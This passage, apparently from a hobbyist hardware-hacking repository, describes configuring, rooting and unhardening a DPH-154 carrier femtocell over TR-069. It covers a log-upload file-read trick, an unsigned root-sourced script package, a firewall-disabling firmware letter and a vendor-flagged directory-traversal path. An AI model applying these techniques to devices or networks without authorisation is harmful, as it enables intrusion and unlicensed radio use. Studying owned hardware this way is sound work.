> ### ⭐⭐⭐ **THIS IS THE PART THAT SURPRISES PEOPLE. ON A 154 THE ACS IS NOT JUST THE WAY IN — IT IS THE ENTIRE CONTROL SURFACE.**
> **JP:** *"there are many things we did to get it all configured using just our ACS."*
> ⇒ **On a 151 or a nano3G you do this work at a DMI console. The 154 has none.** ⭐ **Every knob
> below is reached by `SetParameterValues` over the session the device itself opened.**
> 📌 **49 distinct parameters are exercised by the ACS in the 2g corpus. Grouped by what they do:**

### 🆔 Identity and inventory — *read these first; they tell you what you are holding*
```
Device.DeviceInfo.SerialNumber · ModelName · SoftwareVersion · HardwareVersion
Device.DeviceInfo.ProvisioningCode
Device.DeviceInfo.X_00000C_RouterModuleVersion
Device.DeviceInfo.X_00000C_Tampered          ⬅ ⛔ READ THIS BEFORE ANYTHING ELSE. See Phase 4.
```

### 📞 Management-session control
```
Device.ManagementServer.PeriodicInformInterval    ⬅ the dial cadence. Shorten it to iterate faster.
Device.ManagementServer.ParameterKey
Device.ManagementServer.X_00000C_ProvisioningStatus
```

### 🌐 Core network identity — *this is where you tell it it is YOUR network*
```
Device.Services.FAPService.1.CellConfig.UMTS.CN.X_00000C_MCC     ⬅ 999
Device.Services.FAPService.1.CellConfig.UMTS.CN.X_00000C_MNC     ⬅ 99
Device.Services.FAPService.1.CellConfig.UMTS.CN.LACRAC
Device.Services.FAPService.1.CellConfig.UMTS.CN.SAC
Device.Services.X_00000C_FAPService.Cell.OTACellID
Device.Services.X_00000C_FAPService.Cell.RNCIdentity
```
⭐ **This is the CWMP equivalent of the `iapc-gw-shim` identity problem on the other models** — the
cell must present an identity your core will accept, or RRM tears it down seconds after it comes up.

### 🔗 Where it connects
```
Device.Services.FAPService.1.FAPControl.UMTS.Gateway.SecGWServer1  ⬅ the security gateway
Device.Services.X_00000C_FAPService.FGW.Fqdn · FGW.Status          ⬅ the femto gateway
Device.Services.FAPService.1.Transport.Tunnel.IKESA.1.IPAddress · .Status
```
📌 **`IKESA` is the IPsec SA.** ⚠️ **The DPH-153 route documented by others works by DISABLING IPsec
and repointing these** — same idea, reached differently. See [`BRINGUP-DPH153.md`](BRINGUP-DPH153.md).

### 📡 Radio control — *and the gate that stops this page*
```
Device.Services.FAPService.1.FAPControl.AdminState · OpState · RFTxStatus
Device.Services.X_00000C_FAPService.Enabled          ⬅ 🔴 refused 9003/9007 while tampered
Device.Services.X_00000C_FAPService.Radio.Status
```

### 🚪 Access control — *the 154's version of the CSG trap*
```
Device.Services.FAPService.1.AccessMgmt.AccessMode
```
> ⛔ **On the nano3G, the equivalent pair (`accessDecisionMode` + `csgAccessMode`) is the single
> nastiest failure in this whole corpus: set one without the other and you get a SILENT DENY-ALL
> that every instrument reads as healthy.** ⭐ **Assume the same class of trap here and verify with
> a handset, not with a readback.** 📌 [`TRAPS.md`](TRAPS.md).

### 🛰 GPS
```
Device.Services.FAPService.1.Capabilities.GPSEquipped · Device.Services.X_00000C_FAPService.GPS.
```
⚠️ **Many carrier femtocells refuse to radiate without a GPS fix** — a location-compliance gate,
separate from the tamper gate. **Check it before concluding the tamper bit is your only blocker.**

### 📝 Logs, diagnostics — *and the injection surface from Phase 2*
```
Device.X_00000C_LogUpload.Tuning              ⬅ ⭐ THE LEVER. Also the legitimate NV-config channel.
Device.X_00000C_LogUpload.OnDemand.URL · OnDemand.Triggered
Device.X_00000C_LogUpload.Periodic.URL · Periodic.Enable · Periodic.Interval
```
⭐⭐ **`OnDemand.Triggered` makes the unit upload a diagnostic bundle to a URL you choose** — ⇒ **a
read primitive that needs no shell at all**, and `ENV_DIAG_FILE_LIST` (set through `Tuning`) chooses
what goes in it. **Point it at your own HTTP server and read the device's own files.**

### 💓 The CMHS / heartbeat tier
```
X_00000C_MHS.Config.MaxStatsInterval · UpperHeartbeatInterval
X_00000C_MHS.Conn.ConnectionAttemptsBeforeUnavailable · GracefulShutdownWaitTime
```
📌 **CMHS is a SEPARATE server from the ACS, on a SEPARATE IP** (Phase 1, item 4) — and a unit can
be happily informing the ACS while failing CMHS entirely.

---

### ✅ **SO: WHAT YOU HAVE AFTER PHASE 3**

**A unit whose identity, core, gateway, access mode and NV environment you set — all through a
session it opened to you.** **From here the software half of [`BRINGUP.md`](BRINGUP.md) Phases 4–8
applies**: point it at your core, give it radio parameters, unlock, connect.

⛔ **Except on this unit it stops, and the next phase is why.**

---

## 🔴 Phase 4 — The tamper bit, and why this page stops here

**The radio has its own gate, and it is enforced independently of everything above.**

```
X_00000C_Tampered = 1         14 readbacks, consistent
FAPService.Enabled            REFUSED — FAULT 9003 / 9007
```

⇒ **A tampered unit will provision, accept configuration, and refuse to transmit.** Every other
instrument reads healthy. ⭐ **This is the failure that looks exactly like a configuration mistake
and is not one.**

> ### ⛔ AND THE MOST IMPORTANT THING ON THIS PAGE: **THE BIT CAN BE SET BY YOU, AND IT IS ONE-WAY**
> [`Trap 41`](TRAPS.md#41-opening-the-case-can-destroy-a-factory-configuration) is the full entry.
> **Opening the case and guessing the jumper pattern trips a one-way tamper latch in flash.** The
> pattern is **one-hot — one real jumper among blanks, six candidates** — so a guess is far more
> likely wrong than right.
> ✅ **Leaving jumpers off is safe. Restoring a pattern from memory is not.**
> ⇒ 🎯 **If you buy a 154, buy one that has never been opened, and do not open it.** The route above
> needs no case access at all — **and the case is where the radio gets lost.**

---

## What would finish this guide

**One DPH-154 with `X_00000C_Tampered = 0`**, taken through Phases 1–3 and then the software half of
[`BRINGUP.md`](BRINGUP.md). Specifically still unknown:

- **Whether `FAPService.Enabled` is accepted** once the tamper bit is clear — **the fault codes are
  the only evidence we have, and they were taken on a tampered unit.**
- **Whether the tamper bit is clearable at all.** ⛔ **Assume not.** Nothing here has cleared one, and
  a one-way latch in flash is exactly the sort of thing that is not meant to be.
- **Which config-bank layout applies.** The 154 selects **named UBI volumes, not numbered banks** —
  U-Boot reads a 4-byte `default_bank` value, and `config_bank_1`/`config_bank_2` **do not exist on
  it at all.** ⇒ [`Trap 2`](TRAPS.md#2-which-config-bank-is-live-differs-per-model--and-guessing-kills-the-cell)
  does not apply to this model in the same form.

> ### ✅ **ROUTES CLOSED BY MEASUREMENT — RECORDED SO NOBODY SPENDS A NIGHT REOPENING THEM**
> **A guide that lists only open questions invites the same dead ends to be re-tried.** These three
> are shut, each with the instrument that shut it:
> ```
> netannounce / udp 5050   CLOSED  bound on a DPH-151 (read from its SOCKET TABLE, not a scan),
>                                  but a 154 has NO Ralink to send from, its iptables-282F ruleset
>                                  has ZERO inbound-NEW ACCEPTs against 2 in every 205*/224*/234*
>                                  set, and a 90 s passive capture saw 0 UDP from the unit
>                                  ⇒ no conntrack window ever opens.
> CMHS as a command channel CLOSED  the binary carries FOUR FIXED fully-qualified literals and
>                                  ZERO format specifiers -- nothing interpolable. It can be
>                                  spoken to; it cannot be made to carry an argument you choose.
> a cert-chain swap         CLOSED  the alternative chain is a RE-SIGNATURE of the same identity:
>                                  identical leaf public key, identical SKI, and its SAN is a
>                                  strict SUPERSET. Nothing to gain -- confirmed independently
>                                  rather than by trusting the deployed code's own comment.
> ```
> ⭐⭐ **`CMHS is inert` is the one worth internalising, because it is counter-intuitive:** CMHS is
> the **only live management channel** on a unit whose CWMP is dead, so it reads like the obvious
> way in. ⇒ ***Being the only channel left does not make it a channel that can carry a payload.***
> ⚠️ **What is still OPEN on CMHS, and it is a different question: whether it can TRIGGER A DOWNLOAD
> or SET A URL.** **Both software-download routes need something to hand them a URL, and CWMP — the
> documented trigger — is the dead one.** ⇒ 🎯 **That is the real remaining question on this page.**
> ⛔ **BOUND: one probe of CMHS's settable surface had a FAILING CONTROL, so its zeros are
> inadmissible and are not quoted here.** **Unmeasured, not measured-negative.**

---

## Two model-specific facts worth having

- **Its U-Boot environment sets `consoledev=/dev/null`** ⇒ **Linux never opens that UART**, and a
  serial capture goes silent after `Starting kernel`. ⚠️ Two people spent ~20 minutes on baud sweeps
  before finding it — **97 % `0x00` is a line held LOW, not misframed data.**
  ⛔ **Do not carry this to another model.** It was measured on the **154's** environment; applying
  it elsewhere has already caused one serial route to be written off wrongly on a different device.
  ⭐ **And note what it does *not* say: U-Boot's own console is a separate stage, and nobody has
  confirmed it dead on a 154.**
- **The external antenna port was deleted** relative to the 151's MCX. ⇒ **The "one room, heavily
  attenuated, remote antenna" deployment is not available on this model.**

> ### ✅ **SETTLED 2026-09-16 BY THE DEVICE'S OWN KERNEL — IT *IS* picoChip, AND IT IS A SINGLE SoC**
> ~~*"The DPH-154 is not picoChip" is not established … the 154's SoC identity is genuinely
> unsettled."*~~ 🔴 **That stood on two third-party attributions. The unit answers it itself:**
> ```
> its serial boot log      Image Name: Linux-3.0.0-ip30xxff-xc-245.0
> its own NAND rootfs      ip30xxff-xc-239.0
> ```
> ⇒ ⭐ **`ip30xx` is ip.access's platform designation for the picoChip PC30xx.** **Two independent
> surfaces on the device, agreeing.**
> ### ⭐⭐ **AND THE OLD BLOCK'S RECONCILIATION WAS RIGHT — IT JUST STOPPED ONE STEP SHORT**
> **The AD9365 is the RF TRANSCEIVER; the PC30xx is the SoC/baseband. Different components, both
> present, no contradiction.** ⇒ **The reasoning was sound and the conclusion was stale.**
> ### 🔴 **AND THE CONSEQUENCE IS STRUCTURAL, NOT TRIVIA — IT IS *ONE* PROCESSOR, NOT TWO**
> ```
> DPH-151   Ralink + picoChip PC202   TWO SoCs   <- the Ralink is the LAN-facing one, with telnet
> DPH-154   picoChip PC30xx           ONE SoC    <- NO RALINK. AT ALL.
> ```
> ⇒ ⛔ **Every Ralink-side route — `rroot.py`, the telnet-as-guest path, anything addressed to
> `192.168.157.185` — is STRUCTURALLY DEAD on a 154.** ⚠️ **The three `192.168.157.185` strings that
> DO appear in its rootfs (`iptables-customerA-rules`, `opt/cisco/reset`, `opt/cisco/DslmSsp`) are
> INHERITED FROM THE 151/153 LINEAGE and name a peer this product does not have.**
> ⭐⭐ **A leftover string naming a nonexistent host reads exactly like evidence that the host
> exists** — and it is in the firewall rules, which is the most convincing place for it to be.


---

## 🔀 Choose your route by WHAT YOU ALREADY HAVE — three of the four are free

> ### ⭐⭐⭐ **THE TRAP IS NOT THAT THE EXPENSIVE ROUTE IS WRONG. IT IS THAT THE EXPENSIVE ROUTE IS THE ONE THAT WORKS REGARDLESS OF PRECONDITIONS — SO IT IS THE ONE THAT GETS WRITTEN DOWN.**

| mechanism | cost | you must already have |
|---|---|---|
| `wizard` UDP/14677 backdoor | free — no reboot, no flash | a unit that **has** it. 151/153 generation. ⚠️ **status on a 154 is UNMEASURED** |
| **`diagnosticTuning` (2320) over DMI** | free — no reboot, no flash | **a DMI console** — which a 151 or nano3G has |
| **`X_00000C_LogUpload.Tuning` over CWMP** | free — no reboot, no flash | **a CWMP session** — which a 154 gives you ⬅ **PHASE 2** |
| **software download, type `0x5007` "sdphook"** | **free — no bank write at all** | the ability to **serve a package** ⬅ ✅ **THIS IS HOW THE DPH-151 GOT ROOT** |
| software download, a **full firmware image** | ⛔ **rewrites both U-Boot banks. Irreversible.** | the ability to serve an image |

### 🎯 **AND THE TWO GOALS HAVE DIFFERENT PRICES — ASK WHICH ONE YOU ARE HERE FOR**

```
GET ROOT / SET NV VARIABLES     any of the top three. FREE.
CHANGE FS_VARIANT PERSISTENTLY  the software download, and ONLY that -- because FS_VARIANT comes
                                from sw_description.dat, re-exported by /etc/profile every boot.
```
> ⭐⭐ **`/etc/profile:56` reads `FS_VARIANT` from the software description and `:63` exports it, and
> `/etc/profile` is the ONLY file in the whole rootfs that assigns it** — `rcS:53` even says so in
> its own comment: *"done after sourcing /etc/profile so FS_VARIANT is set"*.
> ⇒ ✅ **So the irreversible section below is RIGHT about its own goal.** ⛔ **It is only wrong as an
> answer to *"how do I get in"*, which is what it used to be presented as.**

⇒ **If you want a shell and your NV variables, you are done at Phase 2 and you should not read the
next section as instructions.**

---

> ### 🔴🔴🔴 **"SOFTWARE DOWNLOAD" IS TWO COMPLETELY DIFFERENT OPERATIONS, AND THIS PAGE WAS TREATING THEM AS ONE**
> `[JP: "we used the software download for the 151 I thought." He is right — and it is the CHEAP one.]`
>
> | | **`0x5007` "sdphook"** | **a full firmware image** |
> |---|---|---|
> | payload | **a shell script** | a filesystem |
> | what the device does | `post_swdl_hook` **SOURCES IT AS ROOT** | `activate_bank` → `uboot-install` |
> | bank / bootloader write | ⭐ **NONE — a trailing `exit 0` returns from the sourced script and skips `post_swdl_hook`'s `delete_config` / `switching_bank` tail** | ⛔ **BOTH U-Boot banks rewritten** |
> | reversible | ✅ **yes — "it never writes a firmware bank, so the active image stays verifiable"** | ⛔ **no** |
> | status here | ✅ **the route that rooted a DPH-151** | ⚠️ **tested on the 154 by JP; did not work** |
> | **the `FS_VARIANT` dev-letter branch** | ⛔ **NOT REACHABLE** | ✅ **this is where it lives** |
>
> ⇒ ⭐⭐⭐ **The irreversibility belongs to the IMAGE variant, not to "software download".** ⛔ **A
> reader who learns *"software downloads rewrite bootloaders"* will avoid the cheap one too — which
> is the one that actually worked on a sibling model.**
> ### ⛔⛔ **AND THE MIRROR ERROR, WHICH IS THE ONE THIS TABLE NOW INVITES: YOU CANNOT GET THE DEV-LETTER BRANCH CHEAPLY.**
> **`init_nv_env` is called from `swdl_client:1043/1054`, immediately after
> `mount -o loop -t cramfs $1/images/fs.bin` — it reads `FS_VARIANT` out of a MOUNTED FILESYSTEM
> IMAGE.** ⇒ **No filesystem, no branch.** ⛔ **A `0x5007` payload is a shell script; there is
> nothing to loop-mount, so the dev-letter lever is unavailable on the free, reversible path.**
> ⚠️ **Reading the two halves of this table separately — "`0x5007` is free and reversible" and "one
> character turns the firewall off" — and combining them produces a route that does not exist.**
> ⇒ ⭐ ***The dev-letter lever and the reversible download are in different columns, and that is the
> whole point of the table.*** **The lever costs the dual-bank rewrite. That is JP's decision to
> take, not a lane's.**
> 📌 **And on a production unit the branch works AGAINST you every boot:** a variant letter outside
> the eight makes the active-bank path **re-assert the production values on every run**. **The
> firewall is switched on deliberately, by design, not left on by neglect.**
> ### ✅ **WHY `0x5007` NEEDS NO SIGNATURE**
> **Image signing is OFF on these builds (`verifyflash` disabled)** — the package needs only its
> three internal CRCs and a well-formed header. ⇒ **That is the property the whole route rests on.**
> ### ⚠️ **AND THE ONE DETAIL THAT MAKES IT LOOP FOREVER IF YOU MISS IT**
> **The ACS `Download` RPC's `FileSize` MUST EQUAL THE SERVED BYTE COUNT EXACTLY**, or the unit
> fetches a truncated image, the apply fails, and **it retries in a loop.** ⭐ **`stat -c%s` the file
> and put that number in the RPC.**
> ⛔ **DO NOT install the published `cwmp_rce_key`** — its private half is in a public GitHub
> repository. **Mint your own pair.**
> 📌 **The 151's full procedure: [`BRINGUP.md`](BRINGUP.md) ROUTE 3.**

## 📕 THE **FULL-IMAGE** DOWNLOAD ROUTE — NOT USED HERE, AND IT IS THE IRREVERSIBLE VARIANT

> ### ⛔⛔ **DO NOT RUN THIS TO "GET IN". PHASE 2 IS HOW YOU GET IN.**
> **This section stood as Phase 2 until 2026-09-16 and was wrong about what was done.** It is kept
> because **the analysis is sound and the lever is real** — and because a route that vanishes cannot
> be recognised when someone rediscovers it and assumes it is the supported path.
> ⚠️ **It rewrites BOTH U-Boot banks.** A reader who follows a deleted-and-replaced walkthrough
> would have taken an irreversible step for access they already had.

**There is exactly one CWMP-reachable writer of the NV environment, and it is the software-download
path.** Serve the unit a firmware image and it runs, unprompted:

```
CWMP Download -> swdl_client -> activate_bank -> activate_fs -> set_hardened_state
      (loop-mounts OUR fs.bin, reads FS_VARIANT from its /etc/sw_description.dat)
   -> init_nv_env -> setnv_env.sh <variables>
```

> ### 🎯 **THE LEVER IS NOT THE FILE WRITE. IT IS `FS_VARIANT`, AND IT COMES FROM THE IMAGE YOU SUPPLY.**
> `set_hardened_state` loop-mounts the filesystem **you served** and reads `FS_VARIANT` out of its own
> `/etc/sw_description.dat`. The hardening decision is then **a pure function of the 4th character**:
> ### ✅ **THE LETTER SET MEANS *UNHARDENED*. THE VENDOR NAMES THE VARIABLE, SO THERE IS NOTHING TO INTERPRET.**
> ```
> rcS:83-93              FS_LETTER    = `echo $FS_VARIANT | cut -c4`
>                        A C E G I W X Y Z  ->  DEFAULT_UNHARDENED="TRUE"
>                                               ⬆ THE VENDOR'S OWN VARIABLE NAME
>
> swdl_client:1008-1028  ALTFSLETTER  = `echo $1 | cut -c4`
>                        A C E G I W X   Z  ->  "Development release - enabling uboot and
>                                                kernel consoles"
>                                               ENV_FIREWALL_DISABLED        TRUE
>                                               ENV_VERBOSE_CONSOLE_ENABLED  TRUE
>                        else               ->  "Production release - disabling ..."
>                                               ENV_FIREWALL_DISABLED        FALSE
> ```
> ⇒ ⭐ **You choose that character.** **A letter IN the set = development = firewall OFF, consoles
> ON. A letter OUTSIDE it = production = firewall ON.** The unit unhardens *itself*, on your say-so,
> through its own vendor code path.
> ### 🔴 **CORRECTED 2026-09-17 — THIS PAGE HAD THE POLARITY EXACTLY BACKWARDS**
> ~~*"rcS:48 … hardened only for: A C E G I W X Z"*~~
> ⛔ **A reader who trusted that line would serve a "hardened" image in order to HARDEN a unit and
> get the FIREWALL TURNED OFF** — on the operation that rewrites both U-Boot banks.
> ⭐⭐⭐ **THE FIX IS TO QUOTE THE NAME, NOT TO RESTATE THE RULE:** `DEFAULT_UNHARDENED="TRUE"` is
> the vendor's own identifier, and ***a variable the vendor named cannot be re-inverted by a later
> reader's interpretation.*** **Every paraphrase of a polarity is one inversion away from wrong;
> the identifier is not.**
> ### ✅ **THREE INDEPENDENT AGREEMENTS, WHICH IS WHY THIS IS SETTLED AND NOT MERELY RE-ARGUED**
> ```
> 1 CODE              rcS's variable is literally called DEFAULT_UNHARDENED
> 2 VENDOR DEBUG STR  swdl_client prints "Development release" / "Production release"
> 3 DEVICE BEHAVIOUR  a 579.11.127 unit reports 282F -- letter F, OUTSIDE both sets -> production
>                     -> and its firewall is measurably ON: iptables-282F-rules has 0 inbound-NEW
>                        ACCEPTs against 2 in every 205*/224*/234* ruleset, every probe REJECTed
> ```
> ⇒ **Source, the vendor's own words about the source, and a running unit — all three agree.**
> ### ⚠️ **AND THE MEMBERSHIP SPLIT IS REAL AND SURVIVES: `rcS` INCLUDES `Y`, `swdl_client` DOES NOT**
> **The two files agree on POLARITY and differ on MEMBERSHIP, and only on `Y`.**
> ⇒ **A `…Y…` variant is UNHARDENED to `rcS` and PRODUCTION to `swdl_client`** — a unit in that
> state disagrees with itself about what it is. **Someone will hit it.**
> 📌 **Recorded because the worry that resolved the other way is worth keeping: a membership
> disagreement did NOT imply a polarity disagreement.** ⭐ **Two files can differ on WHICH inputs
> take a branch while agreeing perfectly on WHAT the branch does** — ⇒ ***check the two separately,
> because one disagreement is not evidence of the other.***

> ### ⚠️ A LATENT DISAGREEMENT BETWEEN TWO IMPLEMENTATIONS OF THE SAME TEST
> ```
> rcS:84-93          A C E G I W X Y Z   (9 letters — INCLUDES Y)
> swdl init_nv_env   A C E G I W X   Z   (8 letters — NO Y)
> ```
> ⇒ **A `…Y…` variant is treated as UNHARDENED by `rcS` and as HARDENED by `swdl_client`.** **Someone
> will trip over it** — and a unit in that state disagrees with itself about what it is.

⛔ **`-noswap` is never passed** (the operation type is hardcoded), so `activate_bank` **does** run —
which means **`uboot-install` rewrites both U-Boot banks first.** ⇒ **This is not a reversible probe.
It rewrites bootloaders.**

> ### ⚠️ **A PROPERTY OF THE VENDOR'S SCRIPT, RECORDED BECAUSE AN OWNER SHOULD KNOW IT — AND DELIBERATELY NOT WEAPONISED HERE**
> **`swdl_client` extracts the served archive BEFORE it validates anything, and the vendor left the
> guard as a comment:**
> ```
> :700  # TODO: need to ensure this is safe against directory traversal
> :701  #       (e.g. tar file containing ../../../var/ipaccess/nv_env.sh ?!)
> :714  ret=`... | tar x -C $STANDBY_IMAGE_DIR ...`     <- EXTRACT
> :725  validate_bank $STANDBY_BANK                     <- VALIDATE, ELEVEN LINES LATER
> ```
> ⇒ ⭐⭐ **Extraction precedes validation, so a signature check CANNOT prevent a write — the files
> are on disk before anything is verified.** **`validate_bank` stops a bad bank BOOTING; it does not
> stop a bad archive UNPACKING.** ⭐ **The vendor's own `TODO`, naming the attack, is the strongest
> available evidence that nobody added the guard.**
> ### ⛔ **BOUND, CARRIED VERBATIM FROM THE LANE THAT READ IT**
> ***"`bin/tar → busybox` (2014) and whether THIS busybox strips `..` is version-dependent and was
> not executed."*** ⇒ ***UNGUARDED BY THE SCRIPT IS NOT DEMONSTRATED TRAVERSABLE.*** **busybox has
> stripped leading `../` by default for much of its history; nobody has checked this build.**
> ### 🔒 **AND THIS REPO DOES NOT PUBLISH A PAYLOAD FOR IT, BY POLICY AND ON PURPOSE**
> **It is stated because a person who owns one of these needs to know their unit will unpack an
> unsigned archive from whoever it is pointed at** — which is a reason to keep the ACS leg on a
> network you control. ⛔ **It is not a walkthrough, and the crafted archives are not in this repo.**
> ⭐ **Same judgement as the rest of this page: the mechanism stated accurately, stopping short of an
> assembled article** — see the scope note in the [README](../README.md).

📌 **And do not expect `ENV_FIREWALL_DISABLED` in `nv_env.sh` to do anything on its own** — that
value is **dead state** for the running environment. The firewall follows `FS_VARIANT`, not the file.
**The file write is inert; the variant letter is the lever.**
